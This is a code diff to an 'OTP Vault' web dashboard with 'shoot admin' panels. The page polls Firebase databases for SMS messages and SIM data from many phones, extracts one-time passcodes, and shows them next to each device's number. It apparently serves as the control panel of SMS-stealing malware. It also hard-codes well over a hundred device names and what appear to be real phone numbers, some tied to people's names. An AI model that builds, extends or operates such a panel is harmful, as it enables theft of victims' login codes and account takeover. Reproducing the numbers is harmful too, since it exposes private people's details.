@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+=<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -265,7 +265,31 @@
             padding: 24px;
         }
 
-        /* Device section (dark) */
+        .vault-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .back-button {
+            background: rgba(59,130,246,0.2);
+            border: 1px solid rgba(59,130,246,0.5);
+            color: #3b82f6;
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: 0.2s;
+            backdrop-filter: blur(4px);
+        }
+        .back-button:hover {
+            background: #3b82f6;
+            color: white;
+            border-color: #3b82f6;
+            box-shadow: 0 0 12px rgba(59,130,246,0.6);
+        }
+
         .device-section, .mailbox-section {
             background: rgba(15, 23, 42, 0.6);
             backdrop-filter: blur(10px);
@@ -386,7 +410,6 @@
             color: white;
         }
 
-        /* MAILBOX – WHITE BACKGROUND, BLACK TEXT */
         .mailbox-section {
             background: #ffffff;
             backdrop-filter: none;
@@ -396,10 +419,23 @@
         .mailbox-header {
             background: #f8fafc;
             border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 1.5rem;
+            flex-wrap: wrap;
+            gap: 12px;
         }
 
         .mailbox-header h2 {
             color: #0f172a;
+            font-size: 1.3rem;
+            margin: 0;
+        }
+
+        .mailbox-actions {
+            display: flex;
+            gap: 10px;
         }
 
         .mailbox-messages {
@@ -418,7 +454,6 @@
             border-radius: 1rem;
             padding: 12px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            transition: 0.1s;
         }
 
         .otp-header {
@@ -541,6 +576,7 @@
             .device-list { grid-template-columns: 1fr; }
             .search-box-small { margin-left: 0; width: 100%; }
             .filter-bar { flex-direction: column; align-items: stretch; }
+            .mailbox-header { flex-direction: column; align-items: stretch; }
         }
     </style>
 </head>
@@ -571,9 +607,13 @@
         </div>
     </div>
 
-    <!-- OTP Vault Dashboard (initially hidden) -->
+    <!-- OTP Vault Dashboard (shared container) -->
     <div class="otp-vault" id="otpVault">
         <div class="main-container">
+            <div class="vault-header">
+                <div></div>
+                <button id="backToPanelsBtn" class="back-button">← Back to Panels</button>
+            </div>
             <div class="device-section">
                 <div class="filter-bar">
                     <button class="filter-btn active" data-filter="all">📱 ALL NUMBER</button>
@@ -589,7 +629,7 @@
             <div class="mailbox-section">
                 <div class="mailbox-header">
                     <h2>📬 OTP MAILBOX</h2>
-                    <div>
+                    <div class="mailbox-actions">
                         <button id="historyBtn" class="btn">📜 History</button>
                         <button id="clearMailboxBtn" class="btn">🗑 Clear mailbox</button>
                         <button id="refreshNowBtn" class="btn btn-primary">⟳ Check now</button>
@@ -618,6 +658,7 @@
         const privateTextDiv = document.getElementById('privateText');
         const introScreen = document.getElementById('introScreen');
         const panelSelection = document.getElementById('panelSelection');
+        const otpVaultDiv = document.getElementById('otpVault');
 
         function animateIntro() {
             privateTextDiv.innerHTML = '';
@@ -638,60 +679,7 @@
         }
         animateIntro();
 
-        // ========== PANEL DATA ==========
-        const panels = [
-            { name: "shoot admin", url: "/shootadmin", desc: "Full OTP Dashboard" },
-            { name: "shoot admin 228", url: null, desc: "Coming Soon" },
-            { name: "shoot admin 313", url: null, desc: "Coming Soon" },
-            { name: "shoot admin 42", url: null, desc: "Coming Soon" },
-            { name: "shoot admin 205", url: null, desc: "Coming Soon" }
-        ];
-
-        function renderPanels(filter = "") {
-            const grid = document.getElementById('panelsGrid');
-            const filtered = panels.filter(p => p.name.toLowerCase().includes(filter.toLowerCase()));
-            if (filtered.length === 0) {
-                grid.innerHTML = `<div class="empty-mailbox" style="grid-column:1/-1; text-align:center;">No panels found</div>`;
-                return;
-            }
-            grid.innerHTML = filtered.map(p => `
-                <div class="panel-card" data-name="${p.name}">
-                    <div class="panel-icon">⚡</div>
-                    <div class="panel-name">${p.name}</div>
-                    <div class="panel-desc">${p.desc}</div>
-                </div>
-            `).join('');
-            document.querySelectorAll('.panel-card').forEach(card => {
-                card.addEventListener('click', () => {
-                    const name = card.getAttribute('data-name');
-                    if (name === "shoot admin") {
-                        panelSelection.style.display = 'none';
-                        document.getElementById('otpVault').classList.add('active');
-                        if (!window.otpVaultInitialized) {
-                            initOtpVault();
-                            window.otpVaultInitialized = true;
-                        }
-                    } else {
-                        alert("🚀 Coming Soon! This panel will be available shortly.");
-                    }
-                });
-            });
-        }
-
-        document.getElementById('panelSearchInput').addEventListener('input', (e) => renderPanels(e.target.value));
-        document.getElementById('panelSearchBtn').addEventListener('click', () => renderPanels(document.getElementById('panelSearchInput').value));
-        renderPanels();
-
-        // ========== OTP VAULT CODE ==========
-        const FIREBASE_URL = "https://ck-kumar3-default-rtdb.firebaseio.com/.json";
-        const STORAGE_OTPS = "otpVault_otps";
-        const STORAGE_PROCESSED = "otpVault_processed";
-
-        let allReceivedOtps = [];
-        let processedMsgIds = new Set();
-        let currentFilter = "all";
-        let currentSearchNumber = "";
-
+        // ========== FULL DEVICE LIST FOR SHOOT ADMIN 1 (as originally provided) ==========
         const masterDevices = [
             { name: "Redmi A2", sim1: null, sim2: "9401489517" },
             { name: "Sitaram's A05", sim1: "8357907306", sim2: "7879400281" },
@@ -774,16 +762,229 @@
             { name: "Anclucis's S25 Ultra", sim1: "8415098076", sim2: null }
         ];
 
+        // ========== DEVICE DATA FOR SHOOT ADMIN 228 (as provided) ==========
+        const devices228Raw = [
+            { name: "OnePlus Nord CE4 Lite 5G", sim1: "8000935102", sim2: "9602079727" },
+            { name: "TECNO SPARK 10C", sim1: "917020843173", sim2: null },
+            { name: "V2420", sim1: "917032308169", sim2: null },
+            { name: "TECNO SPARK Go 2024", sim1: "918107568149", sim2: null },
+            { name: "Unknown Device 5", sim1: "919729002883", sim2: null },
+            { name: "Unknown Device 6", sim1: "919602315533", sim2: null },
+            { name: "OPPO A17", sim1: "9558648389", sim2: null },
+            { name: "Unknown Device 8", sim1: "8290752694", sim2: null },
+            { name: "Unknown Device 9", sim1: "919798115887", sim2: null },
+            { name: "OPPO A77s", sim1: "8010403685", sim2: null },
+            { name: "OPPO K10", sim1: "918379956946", sim2: "917499956946" },
+            { name: "Unknown Device 12", sim1: "919940618370", sim2: "919587244304" },
+            { name: "CPH2083", sim1: "919307680936", sim2: "917821083428" },
+            { name: "V2439", sim1: "919977338940", sim2: null },
+            { name: "LAVA LXX504", sim1: "917066914404", sim2: null },
+            { name: "V2126", sim1: "919347253771", sim2: null },
+            { name: "OPPO Reno8 T 5G", sim1: "918360338054", sim2: "919509233000" },
+            { name: "TECNO SPARK Go 2023", sim1: "917016225916", sim2: null },
+            { name: "CPH2179", sim1: "917518080200", sim2: "8960971200" },
+            { name: "moto g85 5G", sim1: "917666856781", sim2: null },
+            { name: "realme C33 2023", sim1: null, sim2: null },
+            { name: "V2408", sim1: "919209845088", sim2: "918080007944" },
+            { name: "Unknown Device 23", sim1: "919130767022", sim2: "919273324241" },
+            { name: "V2315", sim1: "919079727952", sim2: null },
+            { name: "Unknown Device 25", sim1: "919765389301", sim2: null },
+            { name: "moto g34 5G", sim1: "919931465221", sim2: null },
+            { name: "realme C21-Y", sim1: null, sim2: "916350456256" },
+            { name: "realme 8", sim1: "919828118186", sim2: "9982666671" },
+            { name: "Laxman's A03", sim1: "918799385337", sim2: null },
+            { name: "OPPO A53s 5G", sim1: "9454749868", sim2: "917307857382" },
+            { name: "realme P1 Speed 5G", sim1: "917666276795", sim2: null },
+            { name: "Unknown Device 32", sim1: null, sim2: null },
+            { name: "V2443", sim1: "917300484485", sim2: "7300484485" },
+            { name: "LZX415", sim1: "919022545568", sim2: null },
+            { name: "Unknown Device 35", sim1: "919680876105", sim2: null },
+            { name: "OnePlus Nord CE3 5G", sim1: "919130808396", sim2: "919699144713" },
+            { name: "V2168", sim1: "916354708648", sim2: null },
+            { name: "V2407", sim1: "918010419077", sim2: null },
+            { name: "OPPO A57", sim1: "918688344071", sim2: null },
+            { name: "Unknown Device 40", sim1: "917734907052", sim2: null },
+            { name: "realme C53", sim1: null, sim2: "916377289613" },
+            { name: "moto g64 5G", sim1: "8766405640", sim2: null },
+            { name: "RMX1811", sim1: null, sim2: null },
+            { name: "OPPO F27 5G", sim1: "6268776764", sim2: null },
+            { name: "V2158", sim1: "918112254538", sim2: null },
+            { name: "V2420", sim1: "917851006587", sim2: null },
+            { name: "V2250", sim1: "919503125141", sim2: null },
+            { name: "moto g45 5G", sim1: "917387605683", sim2: null },
+            { name: "TECNO SPARK 10C", sim1: "919309868342", sim2: null },
+            { name: "pillu", sim1: null, sim2: null },
+            { name: "OPPO A3x 5G", sim1: "7016274528", sim2: null },
+            { name: "Unknown Device 52", sim1: "919653791850", sim2: null },
+            { name: "OPPO K12x 5G", sim1: "917776042065", sim2: "917972635091" },
+            { name: "Unknown Device 54", sim1: "919352776890", sim2: "9602970341" },
+            { name: "V2315", sim1: "917984013833", sim2: null },
+            { name: "moto g35 5G", sim1: "919781302367", sim2: null },
+            { name: "Galaxy A05s", sim1: "919699628528", sim2: null },
+            { name: "Unknown Device 58", sim1: "919521758056", sim2: null },
+            { name: "moto g64 5G", sim1: "917083674749", sim2: null },
+            { name: "OPPO Reno14 5G", sim1: "919325034873", sim2: "8888619965" },
+            { name: "OPPO A5 5G", sim1: "919270752283", sim2: "917507454787" },
+            { name: "realme 8 5G", sim1: "9313463513", sim2: null },
+            { name: "Infinix SMART 8 HD", sim1: "917001925739", sim2: "917363814704" },
+            { name: "OPPO A59 5G", sim1: "919838011960", sim2: null },
+            { name: "Unknown Device 65", sim1: "919680512781", sim2: "919950923573" },
+            { name: "Unknown Device 66", sim1: "918411850844", sim2: "9156222309" },
+            { name: "moto g64 5G", sim1: "918767052170", sim2: null },
+            { name: "V2307", sim1: "917020151516", sim2: null },
+            { name: "V2403", sim1: "919341628655", sim2: null },
+            { name: "Unknown Device 70", sim1: "916378447436", sim2: null },
+            { name: "V2153", sim1: "8000468564", sim2: null },
+            { name: "V2205", sim1: "919508654621", sim2: null },
+            { name: "V2443", sim1: "919529653204", sim2: null },
+            { name: "Redmi A2", sim1: "9602493631", sim2: null },
+            { name: "Unknown Device 75", sim1: "916350564600", sim2: "916350564600" },
+            { name: "V2321", sim1: "918709517128", sim2: null },
+            { name: "V2249", sim1: "918690029867", sim2: null },
+            { name: "Unknown Device 78", sim1: "918890503965", sim2: null },
+            { name: "Unknown Device 79", sim1: "918084899340", sim2: "919661549377" },
+            { name: "Unknown Device 80", sim1: "918830077216", sim2: null },
+            { name: "realme Narzo 20", sim1: "919011431524", sim2: null },
+            { name: "Unknown Device 82", sim1: "918078633561", sim2: null },
+            { name: "V2250", sim1: "919001544542", sim2: "919829026583" },
+            { name: "moto g85 5G", sim1: "919579390488", sim2: null },
+            { name: "Unknown Device 85", sim1: "919023261366", sim2: "916375887404" },
+            { name: "Unknown Device 86", sim1: "919351777034", sim2: "916281190852" },
+            { name: "CPH2179", sim1: "919257425516", sim2: null },
+            { name: "Unknown Device 88", sim1: "917459057467", sim2: "971552018435" },
+            { name: "Unknown Device 89", sim1: "917621040254", sim2: "919512532616" },
+            { name: "V2205", sim1: "917700069064", sim2: null },
+            { name: "Nothing Phone (2a)", sim1: "919989658465", sim2: null },
+            { name: "BK 960", sim1: "9765478705", sim2: "919284108912" },
+            { name: "Unknown Device 93", sim1: "917488290572", sim2: null },
+            { name: "realme 14x 5G", sim1: "917002525858", sim2: null },
+            { name: "Redmi Note 13 Pro+ 5G", sim1: "919347253775", sim2: "919182021841" },
+            { name: "V2403", sim1: "917877205751", sim2: null },
+            { name: "V2315", sim1: "916353460635", sim2: null },
+            { name: "V2403", sim1: "918302986947", sim2: "919636704149" },
+            { name: "OnePlus Nord CE 2", sim1: "917083440836", sim2: null },
+            { name: "Galaxy M30s", sim1: "918780142481", sim2: "918141747407" },
+            { name: "Unknown Device 101", sim1: "7498122065", sim2: null },
+            { name: "V2315", sim1: "919834518014", sim2: "917378824548" },
+            { name: "realme 3", sim1: "919327608884", sim2: null },
+            { name: "motorola one fusion+", sim1: null, sim2: null },
+            { name: "Unknown Device 105", sim1: "919725138569", sim2: null },
+            { name: "V2403", sim1: "917666412506", sim2: null },
+            { name: "V2420", sim1: "918261046221", sim2: null },
+            { name: "V2420", sim1: "919641543160", sim2: "917067735633" },
+            { name: "OPPO F21 pro", sim1: "919130231617", sim2: "917057747623" },
+            { name: "Unknown Device 110", sim1: "917488290613", sim2: null },
+            { name: "OPPO K13 5G", sim1: "919784101300", sim2: null },
+            { name: "Unknown Device 112", sim1: "917391858517", sim2: null },
+            { name: "V2247", sim1: "917633886609", sim2: "919905424790" },
+            { name: "Laxman's A03", sim1: "917768905018", sim2: null },
+            { name: "OnePlus Nord CE 2", sim1: "919022339719", sim2: null },
+            { name: "OPPO A16k", sim1: "918390828413", sim2: "918551017382" },
+            { name: "realme C33 2023", sim1: "918418276650", sim2: null }
+        ];
+
+        // Clean phone numbers (remove 91 prefix, keep 10 digits)
+        function cleanPhoneNumber(num) {
+            if (!num || typeof num !== 'string') return null;
+            let digits = num.replace(/\D/g, '');
+            if (digits.length === 12 && digits.startsWith('91')) return digits.substring(2);
+            if (digits.length === 10) return digits;
+            if (digits.length > 10) return digits.slice(-10);
+            return null;
+        }
+
+        const devices228 = devices228Raw.map(d => ({
+            name: d.name,
+            sim1: cleanPhoneNumber(d.sim1),
+            sim2: cleanPhoneNumber(d.sim2)
+        }));
+
+        // ========== PANEL CONFIGURATIONS ==========
+        const panelConfigs = {
+            "shoot admin 1": {
+                firebaseUrl: "https://ck-kumar3-default-rtdb.firebaseio.com/.json",
+                devices: masterDevices,
+                storagePrefix: "panel1"
+            },
+            "shoot admin 228": {
+                firebaseUrl: "https://pm-kishan-23gug-default-rtdb.firebaseio.com/.json",
+                devices: devices228,
+                storagePrefix: "panel228"
+            }
+        };
+
+        // ========== PANEL SELECTION UI ==========
+        const panels = [
+            { name: "shoot admin 1", desc: "Full OTP Dashboard" },
+            { name: "shoot admin 228", desc: "Full OTP Dashboard" },
+            { name: "shoot admin 313", url: null, desc: "Coming Soon" },
+            { name: "shoot admin 42", url: null, desc: "Coming Soon" },
+            { name: "shoot admin 205", url: null, desc: "Coming Soon" }
+        ];
+
+        function renderPanels(filter = "") {
+            const grid = document.getElementById('panelsGrid');
+            const filtered = panels.filter(p => p.name.toLowerCase().includes(filter.toLowerCase()));
+            if (filtered.length === 0) {
+                grid.innerHTML = `<div class="empty-mailbox" style="grid-column:1/-1; text-align:center;">No panels found</div>`;
+                return;
+            }
+            grid.innerHTML = filtered.map(p => `
+                <div class="panel-card" data-name="${p.name}">
+                    <div class="panel-icon">⚡</div>
+                    <div class="panel-name">${p.name}</div>
+                    <div class="panel-desc">${p.desc}</div>
+                </div>
+            `).join('');
+            document.querySelectorAll('.panel-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    const name = card.getAttribute('data-name');
+                    if (panelConfigs[name]) {
+                        loadPanel(name);
+                    } else {
+                        alert("🚀 Coming Soon! This panel will be available shortly.");
+                    }
+                });
+            });
+        }
+
+        document.getElementById('panelSearchInput').addEventListener('input', (e) => renderPanels(e.target.value));
+        document.getElementById('panelSearchBtn').addEventListener('click', () => renderPanels(document.getElementById('panelSearchInput').value));
+        renderPanels();
+
+        // ========== GLOBAL OTP VAULT STATE (per panel) ==========
+        let currentPanelName = null;
+        let currentFirebaseUrl = null;
+        let currentMasterDevices = [];
+        let pollInterval = null;
+        let allReceivedOtps = [];
+        let processedMsgIds = new Set();
         let didToDeviceMap = {};
         let nameToStatusMap = {};
+        let currentFilter = "all";
+        let currentSearchNumber = "";
 
-        function cleanPhoneNumber(simValue) {
-            if (!simValue || typeof simValue !== 'string') return null;
-            const digitsOnly = simValue.replace(/\D/g, '');
-            if (digitsOnly.length === 12 && digitsOnly.startsWith('91')) return digitsOnly.substring(2);
-            if (digitsOnly.length === 10) return digitsOnly;
-            if (digitsOnly.length > 10) return digitsOnly.slice(-10);
-            return null;
+        function getStorageKeys() {
+            const prefix = panelConfigs[currentPanelName]?.storagePrefix || "default";
+            return {
+                otps: `otpVault_otps_${prefix}`,
+                processed: `otpVault_processed_${prefix}`
+            };
+        }
+
+        function persistOtps() {
+            const keys = getStorageKeys();
+            localStorage.setItem(keys.otps, JSON.stringify(allReceivedOtps));
+            localStorage.setItem(keys.processed, JSON.stringify(Array.from(processedMsgIds)));
+        }
+
+        function loadPersistedData() {
+            const keys = getStorageKeys();
+            const o = localStorage.getItem(keys.otps);
+            if (o) allReceivedOtps = JSON.parse(o);
+            const p = localStorage.getItem(keys.processed);
+            if (p) processedMsgIds = new Set(JSON.parse(p));
+            renderMailbox();
         }
 
         function isDesiredOtp(msgObj) {
@@ -800,12 +1001,12 @@
         async function copyNumber(num) { if(num) { await navigator.clipboard.writeText(num); showToast(`📞 Copied: ${num}`); } else showToast("No number"); }
         async function copyOtp(code, full) { let c = code || extractOtpCode(full); if(c) { await navigator.clipboard.writeText(c); showToast(`✅ Copied OTP: ${c}`); } else showToast("⚠️ Could not detect OTP"); }
 
-        async function fetchAllFirebaseData() { const r = await fetch(FIREBASE_URL); if(!r.ok) throw new Error(`HTTP ${r.status}`); return r.json(); }
+        async function fetchAllFirebaseData() { const r = await fetch(currentFirebaseUrl); if(!r.ok) throw new Error(`HTTP ${r.status}`); return r.json(); }
         function extractAllSmsMessages(data) { const msgs = []; function t(o) { if(!o||typeof o!=='object') return; if(o.Sms) for(const did in o.Sms) for(const id in o.Sms[did]) if(o.Sms[did][id]?.msg) msgs.push({...o.Sms[did][id], did, msgId:id}); for(const k in o) t(o[k]); } t(data); return msgs; }
         function extractDeviceInfo(data) { const map={}, nameStatus={}; function t(o) { if(!o||typeof o!=='object') return; if(o.Info) for(const k in o.Info) { const d=o.Info[k]; if(d?.did) { map[d.did]={...map[d.did], name:d.Name||"Unknown", status:d.status||"Offline"}; nameStatus[d.Name]=d.status||"Offline"; } } if(o.SimINFO) for(const did in o.SimINFO) { const s=o.SimINFO[did]; map[did]={...map[did], sim1:cleanPhoneNumber(s.sim1), sim2:cleanPhoneNumber(s.sim2)}; } for(const k in o) t(o[k]); } t(data); return { didMap:map, nameStatus }; }
 
         function renderDeviceList() {
-            let filtered = [...masterDevices];
+            let filtered = [...currentMasterDevices];
             if(currentFilter==="online") filtered = filtered.filter(d=>nameToStatusMap[d.name]==="Online");
             else if(currentFilter==="offline") filtered = filtered.filter(d=>nameToStatusMap[d.name]!=="Online");
             if(currentSearchNumber.trim()) { const sn=currentSearchNumber.trim(); filtered = filtered.filter(d=>d.sim1===sn||d.sim2===sn); }
@@ -820,9 +1021,6 @@
             `).join('');
             document.querySelectorAll('.copy-number-btn').forEach(btn=>btn.addEventListener('click',e=>copyNumber(btn.getAttribute('data-number'))));
         }
-
-        function persistOtps() { localStorage.setItem(STORAGE_OTPS, JSON.stringify(allReceivedOtps)); localStorage.setItem(STORAGE_PROCESSED, JSON.stringify(Array.from(processedMsgIds))); }
-        function loadPersistedData() { const o=localStorage.getItem(STORAGE_OTPS); if(o) allReceivedOtps=JSON.parse(o); const p=localStorage.getItem(STORAGE_PROCESSED); if(p) processedMsgIds=new Set(JSON.parse(p)); renderMailbox(); }
 
         function createOtpCard(otp) {
             const card = document.createElement('div'); card.className='otp-card';
@@ -847,7 +1045,6 @@
             sorted.forEach(otp=>container.appendChild(createOtpCard(otp)));
         }
 
-        let pollInterval = null;
         async function checkForNewOtps() {
             try {
                 const data = await fetchAllFirebaseData();
@@ -861,7 +1058,7 @@
                         processedMsgIds.add(key);
                         const dev = didToDeviceMap[msg.did] || { name:"Unknown", sim1:null, sim2:null };
                         let num = dev.sim1||dev.sim2;
-                        if(!num) { const m=masterDevices.find(d=>d.name===dev.name); if(m) num=m.sim1||m.sim2; }
+                        if(!num) { const m=currentMasterDevices.find(d=>d.name===dev.name); if(m) num=m.sim1||m.sim2; }
                         newMsgs.push({
                             text:msg.msg, timestamp:msg.date||Date.now(), timeFormatted:formatTime(msg.date||Date.now()),
                             sender:msg.ph||"Unknown", deviceName:dev.name, deviceNumber:num, did:msg.did
@@ -882,24 +1079,55 @@
         function setFilter(f) { currentFilter=f; document.querySelectorAll('.filter-btn').forEach(btn=>btn.classList.toggle('active',btn.getAttribute('data-filter')===f)); renderDeviceList(); }
         function handleSearch() { const v=document.getElementById('searchNumberInput').value.trim(); if(v.length===10 && /^\d+$/.test(v)) { currentSearchNumber=v; renderDeviceList(); } else if(v==="") { currentSearchNumber=""; renderDeviceList(); } else showToast("Enter valid 10-digit number"); }
 
-        async function initOtpVault() {
+        async function initVaultForPanel(panelName) {
+            if(pollInterval) clearInterval(pollInterval);
+            const cfg = panelConfigs[panelName];
+            if(!cfg) return;
+            currentPanelName = panelName;
+            currentFirebaseUrl = cfg.firebaseUrl;
+            currentMasterDevices = cfg.devices;
+            allReceivedOtps = [];
+            processedMsgIds.clear();
+            didToDeviceMap = {};
+            nameToStatusMap = {};
+            currentFilter = "all";
+            currentSearchNumber = "";
+            document.querySelectorAll('.filter-btn').forEach(btn=>btn.classList.toggle('active', btn.getAttribute('data-filter')==='all'));
+            document.getElementById('searchNumberInput').value = "";
             loadPersistedData();
             const data = await fetchAllFirebaseData();
             const { didMap, nameStatus } = extractDeviceInfo(data);
-            didToDeviceMap = didMap; nameToStatusMap = nameStatus; renderDeviceList();
+            didToDeviceMap = didMap; nameToStatusMap = nameStatus;
+            renderDeviceList();
             await markExisting();
-            if(pollInterval) clearInterval(pollInterval);
             pollInterval = setInterval(checkForNewOtps, 2000);
             setTimeout(checkForNewOtps, 500);
+        }
+
+        function loadPanel(panelName) {
+            panelSelection.style.display = 'none';
+            otpVaultDiv.classList.add('active');
+            initVaultForPanel(panelName);
+        }
+
+        function goBackToPanelSelection() {
+            if(pollInterval) clearInterval(pollInterval);
+            otpVaultDiv.classList.remove('active');
+            panelSelection.style.display = 'flex';
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('backToPanelsBtn').addEventListener('click', goBackToPanelSelection);
             document.getElementById('clearMailboxBtn').addEventListener('click', clearMailbox);
             document.getElementById('historyBtn').addEventListener('click', showHistory);
-            document.getElementById('refreshNowBtn').addEventListener('click', () => checkForNewOtps());
+            document.getElementById('refreshNowBtn').addEventListener('click', () => { if(currentFirebaseUrl) checkForNewOtps(); });
             document.getElementById('closeModalBtn').addEventListener('click', closeHistory);
             window.addEventListener('click', (e) => { if(e.target === document.getElementById('historyModal')) closeHistory(); });
             document.querySelectorAll('.filter-btn').forEach(btn=>btn.addEventListener('click',()=>setFilter(btn.getAttribute('data-filter'))));
             document.getElementById('searchBtn').addEventListener('click', handleSearch);
             document.getElementById('searchNumberInput').addEventListener('keypress', e=>{ if(e.key==='Enter') handleSearch(); });
-        }
+        });
     </script>
 </body>
 </html>
+```
